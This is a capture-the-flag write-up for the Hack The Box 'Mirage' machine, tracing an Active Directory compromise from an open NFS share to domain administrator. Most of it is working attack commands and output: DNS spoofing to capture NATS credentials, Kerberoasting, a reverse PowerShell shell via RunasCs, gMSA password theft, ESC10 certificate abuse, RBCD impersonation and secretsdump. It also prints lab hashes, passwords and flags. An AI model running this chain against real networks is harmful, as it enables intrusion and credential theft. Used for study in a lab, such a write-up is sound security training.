# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ nmap -p- 10.129.115.154
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:52 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 00:52 (0:00:00 remaining)
Nmap scan report for 10.129.115.154
Host is up (0.027s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4222/tcp  open  vrml-multi-use
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001 -sCV 10.129.115.154      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:54 CEST
Nmap scan report for 10.129.115.154
Host is up (0.037s latency).

PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-22 23:36:19Z)
111/tcp   open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
///
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
///
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr        1-4 (RPC #100021)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
4222/tcp  open  vrml-multi-use?
///
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
///
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 42m01s
| smb2-time: 
|   date: 2025-07-22T23:37:07
|_  start_date: N/A
```

As you can see, the mount port is open. I will check whether we have rights to access it without a user. You can do this by using the showmount tool.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ showmount -e mirage.htb    
Export list for mirage.htb:
/MirageReports (everyone)
```
As you can see, we can retrieve files from MirageReports. I will do this by first creating a folder to which you will transfer the data. Once the folder has been created, I will transfer the data using the mount command.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ sudo mkdir MirageReports   
[sudo] password for kali: 

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ sudo mount -t nfs mirage.htb:/ ./MirageReports -o nolock
```

As you can see below, we have transferred two PDF files to the machine. I will open them to see if there is any interesting information in them.

```
┌──(kali㉿kali)-[~/HTB/Mirage/MirageReports/MirageReports]
└─$ ls
Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf
```

If you want to view the PDFs, you will first need to move them to the tmp folder, otherwise you will encounter a problem where you cannot view the files. The following commands will enable you to view the files.

```
┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
└─$ sudo cp Incident_Report_Missing_DNS_Record_nats-svc.pdf /tmp/

┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
└─$ sudo chown $USER:$USER /tmp/Incident_Report_Missing_DNS_Record_nats-svc.pdf
```

In the Incident_report file, you can see that there is a problem with a DNS record. You will therefore need to add a new record to your /etc/hosts file.

![[Pasted image 20250725095049.png]]

```
┌──(kali㉿kali)-[/tmp]
└─$ cat /etc/hosts                             
10.129.115.154 mirage.htb dc01.mirage.htb nats-svc.mirage.htb
```

Within the PDF file, I also noticed that there is a user named “Dev_Account_A.” I will enumerate this user to see if I can find a password for it. The passwords I will test are those I found while running my exiftool on the PDF files.

```
┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
└─$ sudo exiftool * pdf
[sudo] password for kali: 
======== Incident_Report_Missing_DNS_Record_nats-svc.pdf
Keywords                        : DAGn7vmxkJQ, BAFmAHycaxU, 0
Author                          : Mostafa Toumi (EmSec)
======== Mirage_Authentication_Hardening_Report.pdf
Keywords                        : DAGoYb7hCCM, BAFmAHycaxU, 0
Author                          : Mostafa Toumi (EmSec)
Error: File not found - pdf
    2 image files read
    1 files could not be read

```

When executing this command, I came across a relevant knowledge article that explains how the process works.
Using the echo command, I send a specially formatted INFO message to a listener on port 4222 on my own machine. This causes the target server to initiate a connection and then send back a CONNECT message with the corresponding authentication data.

I found the exact information I need to use in the echo command by accessing the domain name nats-svc.mirage.htb.

Important: If I do not send an INFO message to the target before it connects, the system will not send a CONNECT message back.

Finally, I use nsupdate to force the target machine to connect to my port 4222, via a custom DNS entry: https://docs.nats.io/reference/reference-protocols/nats-protocol#info

| Username      | Password           |
| ------------- | ------------------ |
| Dev_Account_A | hx5h7F5554fP@1337! |

```
┌──(kali㉿kali)-[~]
└─$ echo 'INFO {"server_id":"Zk0GQ3JBSrg3oyxCRRlE09","version":"1.2.0","proto":1,"go":"go1.10.3","host":"0.0.0.0","port":4222,"max_payload":1048576,"client_id":2392}' | nc -lvnp 4222
listening on [any] 4222 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.115.154] 52137
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}
PING

┌──(kali㉿kali)-[~/HTB/Mirage/natscli/nats-0.2.4-linux-amd64]
└─$ nsupdate
> server 10.129.115.154
> update add nats-svc.mirage.htb 3600 A 10.10.16.25
> send
```

Once I had a username and password, I started looking at what I could do with the `nats` command. This led me to two different things. 

- Jetstream consumer management
- Jetstream stream management

First, I tried to see if I could check the logs of the consumers, but there were no logs to be found. I then looked in the stream logs and found a username and password there.

| Username       | Password          |
| -------------- | ----------------- |
| david.jjackson | pN8kQmn6b86!1234@ |

```
┌──(kali㉿kali)-[~/HTB/Mirage/natscli/nats-0.2.4-linux-amd64]
└─$ ./nats --server nats://10.129.115.154:4222 --user='Dev_Account_A' --password='hx5h7F5554fP@1337!' stream view auth_logs
[1] Subject: logs.auth Received: 2025-05-05 09:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

[2] Subject: logs.auth Received: 2025-05-05 09:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

[3] Subject: logs.auth Received: 2025-05-05 09:19:25
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

[4] Subject: logs.auth Received: 2025-05-05 09:19:26
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

[5] Subject: logs.auth Received: 2025-05-05 09:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

05:55:54 Reached apparent end of data
```

Using these user credentials, I retrieved the data from the LDAP server. I will upload this to Bloodhound so that I can analyse it.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ sudo bloodhound-python -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -d mirage.htb -dc dc01.mirage.htb -ns 10.129.115.154 -c all --zip
INFO: Compressing output into 20250723063426_bloodhound.zip
```

I realized that I could perform a Kerberos attack. I did this using the targetkerboast.py tool, which gave me the hash for the user `nathan.aadam`. I will put this hash in a file and try to crack it using john.

![[Pasted image 20250725095029.png]]

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ python targetedKerberoast/targetedKerberoast.py -v -d 'mirage.htb' --dc-host dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (nathan.aadam)
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$6c7aaf66537626958d39c1384c6745f8$5edf87f75c9bfbf1e480e1409c1b6d909a409f04774ffddd6b6d8d814a4da0b2071a62cfbd9ec89d4a725921529295cabfd3d46eff00bbb7b213c1c64959726fd631df5641e1bcaf0ebd9e405377ebb79af26be3f2dec08a363995f87070376d7436eea02585c1279405fdb21fa3bc43449d94a1a313aed659c1cc11b47a95119c6b1df5de82f2459b48bd0ceeea1964a80ed8b51c0e9fa6830abd4f8c748020e7ba1c09f7d17ef510cfe5e4c6e43c2cf110e00b34c8f2664aae8e5a72322ae962f506a2a4ff8073918af9a8930df79ab84a0eafbe1b9264985e6faffbc2a06c571ddbfb93d50eb6cdc373741430b9f45b948e776054b0d8fe43e417df98b9dfb73622d0bbe102a975579d01a307143b756f831a0113efa91953044137a5a3e45d9d627427076bfbcc5b2aee453c8d503fd072f938b6b45f55b1f339efcc271b666ba3cfc3cdfb95083e2e986d0781866172eb05d055bf4f3a89cdd902cf394fc6273e281678bd521a16f85df8bc131050d79e8e99a13cc026a7eaf214b7c4f7990c8b5f21bda424383ea6ce68d9afbc137ed6fb5062dffe96aabf5303e56cf62f6e93b8ad378860c8842216fe2252060c462e2b4d8a9b2d9516e7c450844740c29b5f0d7a0b8ee0f818849a474fa19bd61cd8794a9bfc31b31f11b8a80e51a47a7d37ebfe0b3ae9f3f59d9272a3efcee3c8601b8baeedab88d3efda1e3118ff68ebcc96d2d97f862737a5f00016685239f0da9ae6bd76d17627228cfef3254bf21e7304db16f9f674a610c2253704ce1589b316db6de69cd47ed4a545adcab916628b824abd071bf53e2c1426ee8d84905d8eaded393935c2994270107c972241bb6722b9f85c824c4dbfb90402ed94c18f3219cb3f23913be0144fd782044b397c658a347b8edea0c8d80a2cd29538a6f48d3cf1686436989506e06f4ca491935b23d905fdd3ab99a82f859f71dfa7059dc0e2c294ccedc154e9f3ec8ae5104d10defb80693f45e527a35bd7b4dba704304a2f54bdbe0c9b5f682e318c4acc503963eba9805fc6da3ca155ae4d9e37d829a78689cb9ae4480fb0b578a6923eb519c5bdd8debc7de89d377153c0e9a5978c6cbbe0a713ee580ee19bd0e120a8ca7f748e8d5e627ec60ca211f2a86a3092d54a4132433e17fcf860a089fce9b570a3943b166f4ad2a66fc6c2a009dd5646aacfb88b54a0eb8a717ac23b60d22ac8d4da7a59f8cd05c56c560bd7b3341a5d6142c486287a2c8b05f1acb9432f88f64b52ac9267e346dd0da34e368b80efe469eb555060d158acfdfa3960072da3e81d83897709e9789a980ec5790f0f6411fa2b462aa7f996149b7bdddc4e623a82db190cb05bf3456d0af14efd1a3133cefeae79ff6ff0614ce5f48fdb8f91bd0c5678782f9a15c2617f98b67cecd1ca77ff851dbbef7273e4236509807caa0298133e8c404ccce14bf70906141397dcc21a6f08cf797675b719290bbbe9f319dddf59b9d32b250ae10fee8b0b30244992430584800792049301f59ef827180b7c4f803d1e442aa91694f3766073478642aeae9e02c564cf13
```

I am now cracking the hash using John.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ sudo nano hash                                                       

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?)     
1g 0:00:00:04 DONE (2025-07-23 07:01) 0.2298g/s 2866Kp/s 2866Kc/s 2866KC/s 3er733..3ddfiebw
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

First, we will create a TGT ticket, export it, and then connect to the Windows server.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ sudo impacket-getTGT mirage.htb/nathan.aadam:'3edc#EDC3' -dc-ip 10.129.115.154 [*] Saving ticket in nathan.aadam.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME=nathan.aadam.ccache                  

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents>
```

As you can see above, we have been able to connect to the server and can now obtain the user flag.

user flag: 55a5da40e87c7f8347700a1a878727f8

```
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> ls


    Directory: C:\Users\nathan.aadam\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/4/2025   1:01 PM           2312 Microsoft Edge.lnk
-ar---         7/22/2025  11:18 AM             34 user.txt


*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> cat user.txt
55a5da40e87c7f8347700a1a878727f8
```

Now I am using `Get-ItemProperty` to see if I can find any automatic logon credentials within the machine. You can do this by using the following command.

```
*Evil-WinRM* PS C:\Users> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | 
Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon

DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
--------------- ----------------- --------------- --------------
mark.bbond      MIRAGE            1day@atime      1
```

Using this user's credentials, I checked Bloodhound to see if I could do anything with this user. If you take a look, you will see that you can change the password of the user `Javier.MMarshall`.

![[Pasted image 20250725095005.png]]

You can do this by first creating a TGTticket, then exporting it so that it will take the authentication from there, and then using the bloodyAD tool to change the password.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ sudo impacket-getTGT -dc-ip 10.129.209.204 mirage.htb/'mark.bbond':'1day@atime' -k
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME=mark.bbond.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ KRB5CCNAME=mark.bbond.ccache bloodyAD -k  --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' set password javier.mmarshall 'Newpassword123'
[+] Password changed successfully!
```

I then attempted to set up a session with the Windows machine, but the user I wanted to connect to appeared to be disabled. I then attempted to connect to the Windows server via the `mark.bbond` account. However, this user is not authorized to log in via Evil-WinRM, presumably due to missing privileges or because WinRM login is restricted for this account.

As an alternative, I am now setting up a PowerShell connection between the target machine and my Kali machine. To do this, I log in again as nathan.aadam, as I did successfully earlier.

Next, I upload the C# file RunasCs.cs to the target machine. This tool will be used to execute code under a different user context. At the same time, I start a listener on my Kali machine so that I can capture and analyse the incoming connection from the target host.

```
┌──(kali㉿kali)-[~/HTB/Mirage/RunasCs]
└─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> upload RunasCs.cs

Info: Uploading /home/kali/HTB/Mirage/RunasCs/RunasCs.cs to C:\Users\nathan.aadam\Documents\RunasCs.cs

Info: Upload successful!
```

Creating the RunasCs_net2.exe application.

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs
```

Connect to your own machine using netcat.

```
Windows connection

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> .\RunasCs_net2.exe mark.bbond 1day@atime Powershell.exe -r 10.10.14.37:4444

Own kali machine
┌──(kali㉿kali)-[~/HTB/Mirage/RunasCs]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.209.204] 60413
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```

If you check using the following command, you will see that the account is not active.

```
PS C:\Windows\system32> net user javier.mmarshall
net user javier.mmarshall
Account active               No
Account expires              Never
         
The command completed successfully.
```

You can change this by using the `set-aduser` command.

```
S C:\Windows\system32> Set-ADUser -Identity javier.mmarshall -Enabled $true
Set-ADUser -Identity javier.mmarshall -Enabled $true
PS C:\Windows\system32> net user javier.mmarshall

Account active               Yes
Account expires              Never
       
The command completed successfully.
```

I also noticed something else: we can't log in because no login hours are allowed.

```
PS C:\Windows\system32> net user javier.mmarshall

Password last set            7/23/2025 4:57:53 PM
Logon hours allowed          None
Local Group Memberships
```

This means that even if you have enabled the account, you will still need to set it to allowed in order to log in as this user. You can do this by using the following command.

```
PS C:\Windows\system32> Set-ADUser -Identity "javier.mmarshall" -Replace @{logonHours=([byte[]](0xFF)*21)}
```
### What is gMSA and how can we misuse it?

During my research, I discovered that there are two ways to exploit a gMSA (Group Managed Service Account). If the gMSA account is already active on a machine, I can steal the token from the process or inject myself, just like with a normal user session.

If the account is not yet active, I can start a scheduled task or service under the gMSA. This automatically logs the account in, after which I can apply the same techniques to gain access.

After I had modified the account, I wanted to remotely retrieve the gMSA password and convert it to an NT hash. The `gMSADumper` tool did not work for this, but with `BloodyAD` I was able to do so using the following command.

![[Pasted image 20250725101334.png]]

```
┌──(kali㉿kali)-[~/HTB/Mirage/gMSADumper]
└─$ bloodyAD -k --host '10.129.6.26' -d 'mirage.htb' -u 'javier.mmarshall' -p 'Newpassword123' --host dc01.mirage.htb get object 'Mirage-Service$' --attr msDS-ManagedPassword  

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==
```

## ESC10 – Weak Certificate Mapping for Schannel Authentication

During my investigation into privilege escalation via AD CS, I used **ESC10**, which exploits weak certificate mapping to enable authentication via Schannel. I have outlined the entire chain step by step below. You can use the article below for this purpose. https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication

First, we will request a TGT for the user whose hash we just cracked. Once the ticket has been created, we can export it so that we can use it for authentication. Once the export is complete, you will change the UPN `mark.bbond` to that of the domain controller. 

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ impacket-getTGT -dc-ip 10.129.6.26 mirage.htb/'Mirage-Service$' -hashes ':305806d84f7c1be93a07aaf40f0c7866' -k
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service$.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME=Mirage-Service$.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ certipy account update \
  -user 'mark.bbond' \
  -upn 'dc01$@mirage.htb' \
  -u 'mirage-service$@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.129.6.26 \
  -target dc01.mirage.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'

```

You will now export the `.ccache` file from `mark.bbond` because we have changed the authentication.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME=mark.bbond.ccache
```

After changing the authentication, I will request a certificate called `mirage-DC01-CA` using the `user` template. The certificate and private key will be stored in the `dc01.pfx` file.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip 10.129.6.26 -dc-host dc01.mirage.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

export `.ccache` from mirage service

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME=Mirage-Service$.ccache
```

I will reset `mark.bbond` UPN to its original UPN name and email address.

```
──(kali㉿kali)-[~/HTB/Mirage]
└─$ certipy-ad account \       
  -u 'mirage-service$' \
  -k -no-pass \
  -target 'dc01.mirage.htb' \
  -upn 'mark.bbond@mirage.htb' \
  -user 'mark.bbond' \
  update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.mirage.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
```

I am going to use the .pfx file I just created to connect to the LDAP server via Schannel-authentication.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.6.26 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.129.6.26:636'
wh[*] Authenticated to '10.129.6.26' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$
```

During my attack chain, I used the command `set_rbcd dc01$ Mirage-Service$` to enable Resource-Based Constrained Delegation (RBCD). This ensured that the `Mirage-Service$` account was authorized to impersonate users on the machine `dc01$`, the domain controller.

```
# set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy
```

I wanted to obtain a Kerberos service ticket for the account `dc01$` (the domain controller) using the previously obtained account `Mirage-Service$`, on which I had set up RBCD (Resource-Based Constrained Delegation). My goal was to use `Mirage-Service$` to impersonate `dc01$` via **S4U2Proxy**, so that I could access the domain controller as a system account.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ impacket-getTGT -dc-ip 10.129.6.26 "mirage.htb/Mirage-Service$" -hashes :305806d84f7c1be93a07aaf40f0c7866
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service$.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME='Mirage-Service$.ccache'

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ impacket-getST -spn 'cifs/dc01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.129.6.26  'mirage.htb/Mirage-Service$' -k -no-pass
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
```

Export the newly created .ccache file, then dump the administrator hash and use it to create the Administrator .ccache file.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ KRB5CCNAME='dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache'

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ impacket-secretsdump 'dc01$'@dc01.mirage.htb -k -no-pass -dc-ip 10.129.6.26 -just-dc-user administrator
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
[*] Cleaning up... 
```

Obtain the admin ccache, export for authentication, and then log in as admin.

```
┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ impacket-getTGT -dc-ip 10.129.6.26 "mirage.htb/Administrator" -hashes ':7be6d4f3c2b9c0e3560f5a29eeb1afb3'
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(kali㉿kali)-[~/HTB/Mirage]
└─$ evil-winrm -i dc01.mirage.htb -r mirage.htb
```

As you can see, I am now logged in as administrator and we can proceed to obtain the root flag.

root flag: eab21331876244aec534137ec32dd24f

```
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/23/2025   7:08 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
eab21331876244aec534137ec32dd24f

```

![[Pasted image 20250725094924.png]]